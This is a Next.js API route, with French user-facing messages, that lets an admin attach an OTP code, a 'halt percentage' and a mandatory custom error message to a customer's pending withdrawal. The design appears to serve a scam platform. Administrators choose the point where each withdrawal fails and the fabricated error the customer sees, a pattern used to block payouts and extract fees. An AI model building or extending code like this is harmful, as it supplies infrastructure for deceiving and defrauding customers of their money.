import { randomUUID } from "node:crypto";
import { eq } from "drizzle-orm";
import { NextResponse } from "next/server";
import { isAdminAuthenticated } from "@/lib/auth";
import { db } from "@/lib/db";
import { withdrawalRequestsTable } from "@/lib/schema";

export async function POST(request: Request) {
  try {
    if (!(await isAdminAuthenticated())) {
      return NextResponse.json({ success: false, message: "Non autorisé." }, { status: 401 });
    }

    const body = await request.json();
    const { withdrawalId, otpCode, haltPercent, haltMessage, errorCode } = body as {
      withdrawalId?: string;
      otpCode?: string;
      haltPercent?: number;
      haltMessage?: string;
      errorCode?: string;
    };

    if (!withdrawalId) {
      return NextResponse.json({ success: false, message: "ID du virement requis." }, { status: 400 });
    }

    if (!otpCode || otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
      return NextResponse.json({ success: false, message: "Le code OTP doit être exactement 6 chiffres." }, { status: 400 });
    }

    if (haltPercent === undefined || !Number.isInteger(haltPercent) || haltPercent < 1 || haltPercent > 100) {
      return NextResponse.json({ success: false, message: "Le pourcentage d'arrêt doit être un entier entre 1 et 100." }, { status: 400 });
    }

    if (!haltMessage?.trim()) {
      return NextResponse.json({ success: false, message: "Le message d'erreur personnalisé est obligatoire." }, { status: 400 });
    }

    const [withdrawal] = await db
      .select()
      .from(withdrawalRequestsTable)
      .where(eq(withdrawalRequestsTable.id, withdrawalId))
      .limit(1);

    if (!withdrawal) {
      return NextResponse.json({ success: false, message: "Virement introuvable." }, { status: 404 });
    }

    if (withdrawal.status !== "pending_admin_otp") {
      return NextResponse.json({ success: false, message: "Ce virement ne peut plus recevoir de code OTP." }, { status: 409 });
    }

    // Mettre à jour le virement avec le code OTP et les paramètres d'arrêt
    await db
      .update(withdrawalRequestsTable)
      .set({
        otpCode,
        haltPercent,
        haltMessage: haltMessage.trim(),
        errorCode: errorCode?.trim() || `ERR_CUSTOM_${haltPercent}`,
        status: "pending_otp",
      })
      .where(eq(withdrawalRequestsTable.id, withdrawalId));

    return NextResponse.json({
      success: true,
      otpCode,
      haltPercent,
      haltMessage: haltMessage.trim(),
      errorCode: errorCode?.trim() || `ERR_CUSTOM_${haltPercent}`,
      message: "Code OTP et paramètres d'arrêt enregistrés. Transmettez le code au client.",
    });
  } catch (error) {
    console.error("Erreur lors de l'envoi du code OTP :", error);
    return NextResponse.json({ success: false, message: "Erreur serveur." }, { status: 500 });
  }
}